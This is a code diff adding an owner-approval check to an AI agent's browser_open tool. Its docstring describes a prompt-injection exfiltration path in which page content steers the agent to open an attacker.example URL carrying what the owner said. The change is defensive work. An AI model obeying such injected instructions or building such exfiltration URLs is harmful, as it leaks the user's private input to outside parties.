@@ -161,6 +161,23 @@ class BrowserTools:
             return f"type '{str(arguments.get('text', ''))[:120]}' into {what}{then}"
         return None
 
+    def needs_owner_yes(self, tool: str, arguments: dict[str, Any], owner_text: str,
+                        sources: list[tuple[str, str]]) -> str | None:
+        """Why browser_open must ask first, or None when the owner or this turn's sources named the address.
+
+        browser_open went to any address the model chose without asking, because it changes nothing
+        on the machine; an injected instruction could make it open
+        https://attacker.example/?q=<what the owner said> and the visit carried the data out. Pages
+        the browser itself returned do not vouch for an address: that is the injection path.
+        """
+        if tool != "browser_open":
+            return None
+        from Agent_Guru.security.url_trust import untrusted
+
+        vouching = [text for source, text in sources if not source.startswith(f"{SERVER_NAME}/")]
+        url = str(arguments.get("url", "")) if isinstance(arguments, dict) else ""
+        return untrusted(url, owner_text, vouching)
+
     async def precheck(self, tool: str, arguments: dict[str, Any]) -> list[str]:
         if tool not in ("browser_click", "browser_type"):
             return []
